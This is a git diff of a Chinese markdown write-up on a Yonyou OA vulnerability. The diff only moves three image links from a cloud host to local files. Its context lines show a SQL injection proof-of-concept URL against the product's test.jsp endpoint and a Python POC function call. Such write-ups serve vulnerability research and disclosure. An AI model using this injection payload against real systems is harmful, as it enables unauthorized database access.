@@ -24,7 +24,7 @@
 
 登录页面如下
 
-![yongyou-1-1](https://typora-1308934770.cos.ap-beijing.myqcloud.com/yongyou-1-1.png)
+![yongyou-1-1](./images/yongyou-1-1.png)
 
 POC
 
@@ -32,7 +32,7 @@ POC
 /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))
 ```
 
-![yongyou-1-2](https://typora-1308934770.cos.ap-beijing.myqcloud.com/yongyou-1-2.png)
+![yongyou-1-2](./images/yongyou-1-2.png)
 
 利用方法与致远OA 的SQL注入类似
 
@@ -76,4 +76,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![yongyou-1-3](https://typora-1308934770.cos.ap-beijing.myqcloud.com/yongyou-1-3.png)
+![yongyou-1-3](./images/yongyou-1-3.png)
